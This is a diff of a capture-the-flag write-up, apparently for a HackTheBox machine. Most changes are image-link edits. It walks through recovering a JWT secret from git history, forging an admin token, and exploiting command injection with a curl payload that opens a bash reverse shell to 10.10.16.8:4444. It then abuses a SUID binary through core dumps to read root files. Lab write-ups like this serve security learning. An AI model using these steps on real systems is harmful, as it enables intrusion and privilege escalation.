@@ -5,14 +5,14 @@ ports scan:
 	3000/tcp http Node.js
 
 enumerate the web pages of port 80:
-![[Pasted image 20240721054724.png]]
+![](images/Pasted%20image%2020240721054724.png)
 The configurations may be very attractive
 but nothing there, but we found the docs (documents of tech), it gives us about to register and login user.
 # Introduction Last updated: 2019-06-01
 
 This is a API based Authentication system. we are using "JWT" tokens to make things more secure. to store the user data we are using mongodb, you can find a demo of how the api works in [here](http://10.10.11.120/api) this is a very secured Authentication system will well done documentation ( sometimes companies hide endpoints ) but our code is public
 
-![[Pasted image 20240721062903.png]]
+![](images/Pasted%20image%2020240721062903.png)
 it is clear that http://localhost:3000/api/priv help server to check auth of admins
 
 And we can also download the source code.
@@ -20,7 +20,7 @@ from .git file,we can get credit dasithsv@gmail.com
 
 	git log --oneline
 
-![[Pasted image 20240721062316.png]]
+![](images/Pasted%20image%2020240721062316.png)
 	67d8da7 removed .env for security reasons
 it seems very interesting because of security reasons!
 we get :
@@ -34,18 +34,18 @@ We have known "using JWT tokens to make things more secure"
 So we try to decode the token of documents
 	``   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg`
 
-![[Pasted image 20240721064825.png]]
+![](images/Pasted%20image%2020240721064825.png)
 We sucessfully cracked it.
 
 From log.js
-![[Pasted image 20240721064938.png]]
+![](images/Pasted%20image%2020240721064938.png)
 It has command injection in 
 	`if (name == 'theadmin'){
         `const getLogs = git log --oneline ${file};
         `exec(getLogs, (err , output) =>{
 
 So we need to make name == 'theadmin'
-![[Pasted image 20240721065843.png]]
+![](images/Pasted%20image%2020240721065843.png)
 
 try to exploit the command injection
 	`curl -s -G 'http://10.10.11.120/api/logs' --data-urlencode "file=>/dev/null;bash -c 'bash -i >& /dev/tcp/10.10.16.8/4444 0>&1'" -H "auth-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MTc4MjUzMzJjMmJhYjA0NDVjNDg0NjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRmZGZkZmRmQHNlY3JldC5jb20iLCJpYXQiOjE2MzUyNjM4Mjh9.cRgg1KkYXYSwz1xpknTFWTHnx8D-7UMewMubwAGsvQ8" | jq -r .`
@@ -56,7 +56,7 @@ upload pspy64 to check background applications, but nothing happened.
 
 Enumerate the templates of machine
 there is nothing attactive in the root /, but in /opt there are some interesting things.
-![[Pasted image 20240721071257.png]]
+![](images/Pasted%20image%2020240721071257.png)
 count is a SUID binary, which means it will run as it’s owner regardless of who runs it. In this case, that user is root. Running it prompts for a filename:
 
 The intended path to exploit this binary is to abuse the file descriptors in use by the count process. The issue in the source code is that it never closes file, which is the handle to the given filepath. That means that as long as the program is running, the handle will be in /proc/[pid]/fd. Typically this would be flushed on the setuid, but because of PR_SET_DUMPABLE, the file handles will stay open. To exploit this, I’ll run the program, and then background it when it gets to the prompt:
@@ -68,7 +68,7 @@ The intended path to exploit this binary is to abuse the file descriptors in use
 	`check it`
 we cannot directly check it because of "cat: 3: Permission denied"
 
-![[Pasted image 20240721072724.png]]
+![](images/Pasted%20image%2020240721072724.png)
 we found only root can read it and there are .ssh doc and .viminfo to inspire us.
 
 There’s a comment in the source // Enable coredump generation. That’s a good hint to try generating a crash of the process. When a program crashes, the system stores the crash dump files in /var/crash. There’s actually already two there:
@@ -81,7 +81,7 @@ SIGSEGV is the signal to send a segmentation fault, which will crash the program
 SIGSEGV 是发送分段错误的信号，这将使程序崩溃。我将发送它，然后使用 fg 恢复程序
 
 There’s a new file in /var/crash
-![[Pasted image 20240721075949.png]]
+![](images/Pasted%20image%2020240721075949.png)
 
 It has all kinds of information about the process at the time of the crash, and a large base-64 encoded blob at the end.
 它包含有关崩溃时进程的各种信息，以及末尾的大型 Base-64 编码 blob。
